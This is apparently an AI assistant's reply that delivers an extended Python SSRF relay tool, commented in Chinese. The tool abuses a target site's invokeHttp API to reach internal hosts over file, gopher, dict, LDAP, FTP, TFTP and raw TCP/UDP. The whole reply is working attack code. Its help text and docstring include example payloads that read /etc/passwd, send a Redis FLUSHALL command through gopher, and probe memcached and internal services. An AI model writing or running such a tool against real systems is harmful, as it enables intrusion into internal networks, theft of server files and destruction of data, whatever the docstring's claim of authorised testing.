Let me read the uploaded file first.以下是增强版的 `ssrf_proxy.py`，在原有 HTTP/HTTPS 支持基础上，新增了 `ftp://`、`file://`、`gopher://`、`dict://`、`ldap://`、`tftp://` 等协议支持，以及通用 TCP/UDP 原始套接字通道：

```python
# -*- coding: utf-8 -*-
"""
SSRF 中转代理（增强版 - 多协议支持）
仅用于授权渗透测试 / 安全研究环境。

功能：
  将打到本地 8081 端口的请求封装为 SSRF 载荷，发给目标站点的
  invokeHttp 接口，由目标服务器代为请求内网资源，并把结果
  修正 Content-Type 后返回给浏览器。

  支持协议：
    http/https  - 标准 HTTP(S) 请求（原有）
    ftp         - FTP 文件下载（通过 ftplib）
    file        - 本地文件读取（通过 invokeHttp file:// 载荷）
    gopher      - Gopher 协议原始 TCP 载荷
    dict        - DICT 协议查询
    ldap        - LDAP 查询（通过 ldap3）
    tftp        - TFTP 文件读取（通过 tftpy）
    tcp         - 原始 TCP 套接字（?u=tcp://host:port/data）
    udp         - 原始 UDP 套接字（?u=udp://host:port/data）

用法：
  python ssrf_proxy.py                          # 默认配置启动
  python ssrf_proxy.py --port 8081 --no-burp    # 不走 Burp 代理
  浏览器访问:
    http://127.0.0.1:8081/?u=http://10.0.0.5/admin
    http://127.0.0.1:8081/?u=ftp://10.0.0.5/pub/secret.txt
    http://127.0.0.1:8081/?u=file:///etc/passwd
    http://127.0.0.1:8081/?u=gopher://10.0.0.5:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A
    http://127.0.0.1:8081/?u=dict://10.0.0.5:11211/stats
    http://127.0.0.1:8081/?u=ldap://10.0.0.5:389/dc=example,dc=com
    http://127.0.0.1:8081/?u=tcp://10.0.0.5:9200/GET / HTTP/1.0\r\n\r\n
    http://127.0.0.1:8081/?u=udp://10.0.0.5:53/raw_hex_payload
"""

import argparse
import base64
import ftplib
import io
import logging
import os
import socket
import struct
import tempfile
import threading
from urllib.parse import urlparse, unquote
from os.path import splitext, basename

import requests
from flask import Flask, request, Response

# -------- 可选依赖（缺失时对应协议降级提示） --------
try:
    import ldap3
    HAS_LDAP3 = True
except ImportError:
    HAS_LDAP3 = False

try:
    import tftpy
    HAS_TFTPY = True
except ImportError:
    HAS_TFTPY = False

# ---------------- 配置（可用环境变量覆盖，避免硬编码凭据） ----------------
DEST_URL          = os.getenv("SSRF_API",          "http://api.xxx.com/api/invokeHttp")
AUTH_COOKIE       = os.getenv("SSRF_AUTH_COOKIE",  "key1=value1;key2=value2;")
INJECT_HEADER_VALUE = os.getenv("SSRF_INJECT_COOKIE", "username.test=ext.bmw.test;")
BURP_PROXY        = os.getenv("SSRF_PROXY",        "http://127.0.0.1:8080")
ACCESS_TOKEN      = os.getenv("SSRF_ACCESS_TOKEN", "")  # 设置后请求需带 ?token= 校验

CONNECT_TIMEOUT   = 5    # 连接超时（秒）
READ_TIMEOUT      = 60   # 读取超时（秒），SSRF 代请求通常较慢
RAW_SOCKET_TIMEOUT = 10  # 原始套接字超时（秒）

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger("ssrf-proxy")

app = Flask(__name__)
session = requests.Session()   # 复用 TCP 连接

# -------- 不应逐跳透传的响应头 --------
HOP_BY_HOP_HEADERS = {
    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
    "te", "trailer", "transfer-encoding", "upgrade", "content-encoding",
    "content-length",
}

MIME_MAP = {
    ".png":   "image/png",
    ".js":    "application/javascript",
    ".jpg":   "image/jpeg",
    ".gif":   "image/gif",
    ".jpeg":  "image/jpeg",
    ".ico":   "image/x-icon",
    ".css":   "text/css",
    ".svg":   "image/svg+xml",
    ".json":  "application/json",
    ".woff":  "font/woff",
    ".woff2": "font/woff2",
    ".txt":   "text/plain",
    ".xml":   "application/xml",
    ".html":  "text/html",
    ".htm":   "text/html",
    ".pdf":   "application/pdf",
    ".zip":   "application/zip",
}


# ─────────────────────────── 工具函数 ───────────────────────────

def get_filetype(url: str) -> str:
    """按 URL 扩展名推断 Content-Type，保证浏览器正确渲染静态资源。"""
    try:
        _, file_ext = splitext(basename(urlparse(url).path))
        return MIME_MAP.get(file_ext.lower(), "text/html")
    except Exception:
        return "text/html"


def build_proxy_headers(resp_headers: dict, target_url: str) -> dict:
    """白名单式透传响应头，剔除逐跳头并修正 Content-Type。"""
    headers = {}
    for name, value in resp_headers.items():
        if name.lower() not in HOP_BY_HOP_HEADERS:
            headers[name] = value
    headers["Content-Type"] = get_filetype(target_url)
    return headers


def extract_content(resp) -> bytes:
    """
    从 invokeHttp 接口的响应中提取实际内容。
    优先取 JSON 中的 data 字段；支持 base64 字段；非 JSON 时降级为原始字节。
    """
    try:
        payload = resp.json()
    except ValueError:
        log.warning("响应非 JSON，按原始内容透传")
        return resp.content

    if isinstance(payload, dict):
        if payload.get("data_b64"):
            try:
                return base64.b64decode(payload["data_b64"])
            except Exception:
                log.warning("data_b64 解码失败，尝试 data 字段")
        data = payload.get("data", "")
        if isinstance(data, str):
            return data.encode("utf-8")
        return str(data).encode("utf-8")

    return resp.content


def collect_files() -> list:
    """收集 multipart 文件字段，供 invokeHttp 转发。"""
    files = []
    for field_name, file_storage in request.files.items():
        files.append({
            "name": field_name,
            "filename": file_storage.filename,
            "content": base64.b64encode(file_storage.read()).decode(),
        })
    return files


def make_error_response(msg: str, status: int = 502) -> Response:
    return Response(f"[SSRF Proxy Error] {msg}", status=status,
                    content_type="text/plain; charset=utf-8")


# ─────────────────────────── 协议处理器 ───────────────────────────

def handle_http(target_url: str) -> Response:
    """原有 HTTP/HTTPS 通道：通过 invokeHttp 接口转发。"""
    body = request.get_data() if request.method != "GET" else (request.data or b"")

    dest_data = {
        "url":         target_url,
        "requestType": request.method.lower(),
        "files":       collect_files(),
        "body":        body.decode("utf-8", errors="replace") if isinstance(body, bytes) else (body or ""),
        "jsonParam":   "",
        "headers":     [{"header": "cookie", "value": INJECT_HEADER_VALUE}],
        "format":      "utf-8",
    }

    headers = dict(request.headers)
    headers["Cookie"]       = AUTH_COOKIE
    headers["Host"]         = urlparse(DEST_URL).netloc
    headers["Content-Type"] = "application/json"

    use_proxies = None if app.config.get("NO_BURP") else {"http": BURP_PROXY, "https": BURP_PROXY}

    try:
        resp = session.post(
            DEST_URL,
            json=dest_data,
            headers=headers,
            proxies=use_proxies,
            timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
            verify=False,
        )
    except requests.exceptions.RequestException as exc:
        log.error("invokeHttp 请求失败: %s", exc)
        return make_error_response(str(exc))

    content      = extract_content(resp)
    proxy_headers = build_proxy_headers(resp.headers, target_url)
    return Response(content, status=resp.status_code, headers=proxy_headers)


def handle_ftp(target_url: str) -> Response:
    """
    FTP 协议：直接从代理机器发起 ftplib 连接，下载文件后返回。
    ftp://user:pass@host:port/path/to/file
    """
    parsed = urlparse(target_url)
    host   = parsed.hostname or "127.0.0.1"
    port   = parsed.port or 21
    user   = parsed.username or "anonymous"
    passwd = parsed.password or "anonymous@"
    path   = unquote(parsed.path) or "/"

    log.info("FTP 请求: %s@%s:%s%s", user, host, port, path)
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=CONNECT_TIMEOUT)
        ftp.login(user, passwd)
        ftp.set_pasv(True)

        buf = io.BytesIO()
        ftp.retrbinary(f"RETR {path}", buf.write)
        ftp.quit()

        buf.seek(0)
        content_type = get_filetype(path)
        return Response(buf.read(), status=200,
                        content_type=content_type,
                        headers={"X-SSRF-Protocol": "ftp"})
    except ftplib.all_errors as exc:
        log.error("FTP 错误: %s", exc)
        return make_error_response(f"FTP error: {exc}")


def handle_file(target_url: str) -> Response:
    """
    file:// 协议：将 file:// URL 直接通过 invokeHttp 接口投递，
    由目标服务器读取其本地文件系统。
    """
    log.info("file:// 请求: %s", target_url)
    dest_data = {
        "url":         target_url,
        "requestType": "get",
        "files":       [],
        "body":        "",
        "jsonParam":   "",
        "headers":     [{"header": "cookie", "value": INJECT_HEADER_VALUE}],
        "format":      "utf-8",
    }
    headers = {
        "Cookie":       AUTH_COOKIE,
        "Host":         urlparse(DEST_URL).netloc,
        "Content-Type": "application/json",
    }
    use_proxies = None if app.config.get("NO_BURP") else {"http": BURP_PROXY, "https": BURP_PROXY}
    try:
        resp = session.post(
            DEST_URL, json=dest_data, headers=headers,
            proxies=use_proxies,
            timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
            verify=False,
        )
        content = extract_content(resp)
        return Response(content, status=resp.status_code,
                        content_type="text/plain; charset=utf-8",
                        headers={"X-SSRF-Protocol": "file"})
    except requests.exceptions.RequestException as exc:
        log.error("file:// invokeHttp 请求失败: %s", exc)
        return make_error_response(str(exc))


def handle_gopher(target_url: str) -> Response:
    """
    Gopher 协议：解析 URL，通过原始 TCP 套接字发送 gopher payload。
    格式: gopher://host:port/_<url-encoded-payload>
    支持两种方式：
      1. 直接 TCP（代理机直连）
      2. 通过 invokeHttp 投递 gopher:// URL（让目标服务器发送）
    默认走方式 2（利用服务端 SSRF），可通过环境变量 GOPHER_DIRECT=1 改为直连。
    """
    if os.getenv("GOPHER_DIRECT", "0") == "1":
        return _gopher_direct(target_url)
    return _gopher_via_ssrf(target_url)


def _gopher_via_ssrf(target_url: str) -> Response:
    """通过 invokeHttp 让目标服务端发送 gopher:// 请求。"""
    log.info("Gopher via SSRF: %s", target_url)
    dest_data = {
        "url":         target_url,
        "requestType": "get",
        "files":       [],
        "body":        "",
        "jsonParam":   "",
        "headers":     [{"header": "cookie", "value": INJECT_HEADER_VALUE}],
        "format":      "utf-8",
    }
    headers = {
        "Cookie":       AUTH_COOKIE,
        "Host":         urlparse(DEST_URL).netloc,
        "Content-Type": "application/json",
    }
    use_proxies = None if app.config.get("NO_BURP") else {"http": BURP_PROXY, "https": BURP_PROXY}
    try:
        resp = session.post(
            DEST_URL, json=dest_data, headers=headers,
            proxies=use_proxies,
            timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
            verify=False,
        )
        content = extract_content(resp)
        return Response(content, status=resp.status_code,
                        content_type="text/plain; charset=utf-8",
                        headers={"X-SSRF-Protocol": "gopher"})
    except requests.exceptions.RequestException as exc:
        log.error("Gopher SSRF 请求失败: %s", exc)
        return make_error_response(str(exc))


def _gopher_direct(target_url: str) -> Response:
    """代理机直接 TCP 连接发送 gopher payload（适用于内网直通场景）。"""
    parsed  = urlparse(target_url)
    host    = parsed.hostname or "127.0.0.1"
    port    = parsed.port or 70
    # gopher URL 路径：/_<payload>，第一个字符是 item-type，跳过它
    raw_path = unquote(parsed.path)
    payload  = raw_path[2:] if raw_path.startswith("/_") else raw_path.lstrip("/")
    # 替换换行符
    payload  = payload.replace("%0d%0a", "\r\n").replace("%0D%0A", "\r\n")

    log.info("Gopher 直连: %s:%s  payload_len=%d", host, port, len(payload))
    try:
        with socket.create_connection((host, port), timeout=RAW_SOCKET_TIMEOUT) as sock:
            sock.sendall(payload.encode("latin-1", errors="replace"))
            chunks = []
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
        return Response(b"".join(chunks), status=200,
                        content_type="text/plain; charset=utf-8",
                        headers={"X-SSRF-Protocol": "gopher-direct"})
    except OSError as exc:
        log.error("Gopher 直连错误: %s", exc)
        return make_error_response(f"Gopher direct error: {exc}")


def handle_dict(target_url: str) -> Response:
    """
    DICT 协议（RFC 2229）：通过原始 TCP 发送 DICT 命令。
    格式: dict://host:port/DEFINE database word
          dict://host:port/d:word          （简写）
          dict://host:port/stats           （memcached/redis 探测）
    """
    parsed  = urlparse(target_url)
    host    = parsed.hostname or "127.0.0.1"
    port    = parsed.port or 2628
    path    = unquote(parsed.path).lstrip("/")

    # 构造 DICT 命令：支持 "d:word:db" 或 "DEFINE db word" 或裸命令
    if path.startswith("d:"):
        parts   = path.split(":")
        word    = parts[1] if len(parts) > 1 else "*"
        db      = parts[2] if len(parts) > 2 else "!"
        command = f"DEFINE {db} {word}\r\n"
    elif path:
        # 裸命令直接发送（适合 memcached stats 等非标用途）
        command = path + "\r\n"
    else:
        command = "SHOW DATABASES\r\n"

    log.info("DICT 请求: %s:%s  cmd=%r", host, port, command)
    try:
        with socket.create_connection((host, port), timeout=RAW_SOCKET_TIMEOUT) as sock:
            sock.sendall(command.encode())
            chunks = []
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
        return Response(b"".join(chunks), status=200,
                        content_type="text/plain; charset=utf-8",
                        headers={"X-SSRF-Protocol": "dict"})
    except OSError as exc:
        log.error("DICT 错误: %s", exc)
        return make_error_response(f"DICT error: {exc}")


def handle_ldap(target_url: str) -> Response:
    """
    LDAP 协议：通过 ldap3 库查询，返回 JSON 格式条目。
    格式: ldap://host:port/base_dn?attributes?scope?filter
    示例: ldap://10.0.0.5:389/dc=example,dc=com
    需要: pip install ldap3
    """
    if not HAS_LDAP3:
        return make_error_response(
            "ldap3 未安装，请执行: pip install ldap3", 501
        )

    parsed     = urlparse(target_url)
    host       = parsed.hostname or "127.0.0.1"
    port       = parsed.port or 389
    base_dn    = unquote(parsed.path).lstrip("/") or ""
    use_ssl    = target_url.lower().startswith("ldaps://")

    # 解析查询字符串: base?attrs?scope?filter
    query_parts = (parsed.query or "").split("?")
    attributes  = query_parts[0].split(",") if query_parts[0] else ["*"]
    scope_str   = query_parts[1].upper() if len(query_parts) > 1 else "SUBTREE"
    search_filter = query_parts[2] if len(query_parts) > 2 else "(objectClass=*)"

    scope_map = {
        "BASE":     ldap3.BASE,
        "ONE":      ldap3.LEVEL,
        "ONELEVEL": ldap3.LEVEL,
        "SUB":      ldap3.SUBTREE,
        "SUBTREE":  ldap3.SUBTREE,
    }
    scope = scope_map.get(scope_str, ldap3.SUBTREE)

    log.info("LDAP 请求: %s:%s  base=%s  filter=%s", host, port, base_dn, search_filter)
    try:
        server = ldap3.Server(host, port=port, use_ssl=use_ssl,
                              connect_timeout=CONNECT_TIMEOUT)
        # 匿名绑定
        conn = ldap3.Connection(server, auto_bind=ldap3.AUTO_BIND_NO_TLS)
        conn.search(base_dn, search_filter, search_scope=scope,
                    attributes=attributes)
        entries = [e.entry_to_json() for e in conn.entries]
        import json
        result = json.dumps(entries, ensure_ascii=False, indent=2)
        return Response(result, status=200,
                        content_type="application/json; charset=utf-8",
                        headers={"X-SSRF-Protocol": "ldap"})
    except Exception as exc:
        log.error("LDAP 错误: %s", exc)
        return make_error_response(f"LDAP error: {exc}")


def handle_tftp(target_url: str) -> Response:
    """
    TFTP 协议：通过 tftpy 库下载文件，返回文件内容。
    格式: tftp://host:port/path/to/file
    需要: pip install tftpy
    """
    if not HAS_TFTPY:
        return make_error_response(
            "tftpy 未安装，请执行: pip install tftpy", 501
        )

    parsed = urlparse(target_url)
    host   = parsed.hostname or "127.0.0.1"
    port   = parsed.port or 69
    path   = unquote(parsed.path).lstrip("/")

    log.info("TFTP 请求: %s:%s/%s", host, port, path)
    try:
        client  = tftpy.TftpClient(host, port)
        tmp     = tempfile.NamedTemporaryFile(delete=False)
        tmp_path = tmp.name
        tmp.close()
        client.download(path, tmp_path, timeout=READ_TIMEOUT)
        with open(tmp_path, "rb") as f:
            content = f.read()
        os.unlink(tmp_path)
        return Response(content, status=200,
                        content_type=get_filetype(path),
                        headers={"X-SSRF-Protocol": "tftp"})
    except Exception as exc:
        log.error("TFTP 错误: %s", exc)
        return make_error_response(f"TFTP error: {exc}")


def handle_raw_tcp(target_url: str) -> Response:
    """
    原始 TCP 套接字通道。
    格式: tcp://host:port/<url-encoded-payload>
    payload 支持 \\r\\n 转义。
    """
    parsed  = urlparse(target_url)
    host    = parsed.hostname or "127.0.0.1"
    port    = parsed.port
    if not port:
        return make_error_response("tcp:// URL 必须指定端口")

    raw     = unquote(parsed.path).lstrip("/")
    payload = raw.replace("\\r\\n", "\r\n").replace("\\n", "\n")

    log.info("TCP 原始请求: %s:%s  payload_len=%d", host, port, len(payload))
    try:
        with socket.create_connection((host, port), timeout=RAW_SOCKET_TIMEOUT) as sock:
            if payload:
                sock.sendall(payload.encode("utf-8", errors="replace"))
            chunks = []
            sock.settimeout(RAW_SOCKET_TIMEOUT)
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    chunks.append(chunk)
            except socket.timeout:
                pass  # 读完即止
        return Response(b"".join(chunks), status=200,
                        content_type="text/plain; charset=utf-8",
                        headers={"X-SSRF-Protocol": "tcp"})
    except OSError as exc:
        log.error("TCP 错误: %s", exc)
        return make_error_response(f"TCP error: {exc}")


def handle_raw_udp(target_url: str) -> Response:
    """
    原始 UDP 套接字通道。
    格式: udp://host:port/<hex-encoded-payload>
    payload 为十六进制字符串，如 "deadbeef"；或普通文本。
    """
    parsed  = urlparse(target_url)
    host    = parsed.hostname or "127.0.0.1"
    port    = parsed.port
    if not port:
        return make_error_response("udp:// URL 必须指定端口")

    raw = unquote(parsed.path).lstrip("/")
    # 尝试作为 hex 解码，失败则作 UTF-8 字节
    try:
        payload = bytes.fromhex(raw)
    except ValueError:
        payload = raw.encode("utf-8", errors="replace")

    log.info("UDP 原始请求: %s:%s  payload_len=%d", host, port, len(payload))
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(RAW_SOCKET_TIMEOUT)
            sock.sendto(payload, (host, port))
            try:
                data, _ = sock.recvfrom(65535)
            except socket.timeout:
                data = b"(no UDP response within timeout)"
        return Response(data, status=200,
                        content_type="text/plain; charset=utf-8",
                        headers={"X-SSRF-Protocol": "udp"})
    except OSError as exc:
        log.error("UDP 错误: %s", exc)
        return make_error_response(f"UDP error: {exc}")


# ─────────────────────────── 协议路由分发 ───────────────────────────

# 协议 -> 处理器映射表
PROTOCOL_HANDLERS = {
    "http":   handle_http,
    "https":  handle_http,
    "ftp":    handle_ftp,
    "file":   handle_file,
    "gopher": handle_gopher,
    "dict":   handle_dict,
    "ldap":   handle_ldap,
    "ldaps":  handle_ldap,
    "tftp":   handle_tftp,
    "tcp":    handle_raw_tcp,
    "udp":    handle_raw_udp,
}


def dispatch(target_url: str) -> Response:
    """根据 URL scheme 分发到对应协议处理器。"""
    scheme = urlparse(target_url).scheme.lower()
    handler = PROTOCOL_HANDLERS.get(scheme)
    if handler is None:
        log.warning("不支持的协议: %s", scheme)
        return make_error_response(
            f"不支持的协议: {scheme!r}。"
            f"支持: {', '.join(sorted(PROTOCOL_HANDLERS))}",
            status=400,
        )
    log.info("分发 [%s] -> %s", scheme.upper(), target_url)
    return handler(target_url)


# ─────────────────────────── Flask 路由 ───────────────────────────

@app.before_request
def check_token():
    """可选 token 鉴权，避免代理被未授权访问。"""
    if not ACCESS_TOKEN:
        return  # 未配置则跳过
    token = request.args.get("token") or request.headers.get("X-Proxy-Token", "")
    if token != ACCESS_TOKEN:
        log.warning("Token 校验失败，来自 %s", request.remote_addr)
        return Response("Forbidden: invalid token", status=403,
                        content_type="text/plain")


@app.route("/", defaults={"path": ""}, methods=["GET", "POST", "PUT",
                                                  "DELETE", "PATCH", "HEAD",
                                                  "OPTIONS"])
@app.route("/<path:path>", methods=["GET", "POST", "PUT", "DELETE",
                                     "PATCH", "HEAD", "OPTIONS"])
def proxy(path):
    """
    主代理入口。
    ?u=<target_url>  指定目标 URL（支持所有已注册协议）。
    """
    target_url = request.args.get("u", "").strip()
    if not target_url:
        help_text = (
            "SSRF 多协议中转代理\n\n"
            "用法: ?u=<target_url>\n\n"
            "支持的协议:\n" +
            "\n".join(f"  {s}://" for s in sorted(PROTOCOL_HANDLERS)) +
            "\n\n示例:\n"
            "  ?u=http://10.0.0.1/admin\n"
            "  ?u=ftp://10.0.0.1/etc/passwd\n"
            "  ?u=file:///etc/passwd\n"
            "  ?u=gopher://10.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A\n"
            "  ?u=dict://10.0.0.1:11211/stats\n"
            "  ?u=ldap://10.0.0.1:389/dc=example,dc=com\n"
            "  ?u=tftp://10.0.0.1/secret.bin\n"
            "  ?u=tcp://10.0.0.1:9200/GET+/+HTTP/1.0%5Cr%5Cn%5Cr%5Cn\n"
            "  ?u=udp://10.0.0.1:53/deadbeef\n"
        )
        return Response(help_text, status=400,
                        content_type="text/plain; charset=utf-8")

    log.info("收到请求 [%s] %s -> %s",
             request.method, request.remote_addr, target_url)
    return dispatch(target_url)


# ─────────────────────────── 启动入口 ───────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(description="SSRF 多协议中转代理")
    parser.add_argument("--port",    type=int, default=8081,  help="监听端口")
    parser.add_argument("--host",    default="127.0.0.1",     help="监听地址")
    parser.add_argument("--no-burp", action="store_true",     help="不走 Burp 代理")
    parser.add_argument("--debug",   action="store_true",     help="Flask 调试模式")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    app.config["NO_BURP"] = args.no_burp

    if args.no_burp:
        log.info("Burp 代理已禁用")
    else:
        log.info("HTTP/HTTPS 请求将通过 Burp 代理: %s", BURP_PROXY)
        session.proxies = {"http": BURP_PROXY, "https": BURP_PROXY}

    session.verify = False  # 忽略 SSL 证书验证（测试环境）

    # 禁用 urllib3 的 InsecureRequestWarning
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    log.info("SSRF 多协议中转代理启动: http://%s:%s", args.host, args.port)
    log.info("支持协议: %s", ", ".join(sorted(PROTOCOL_HANDLERS)))
    app.run(host=args.host, port=args.port, debug=args.debug)
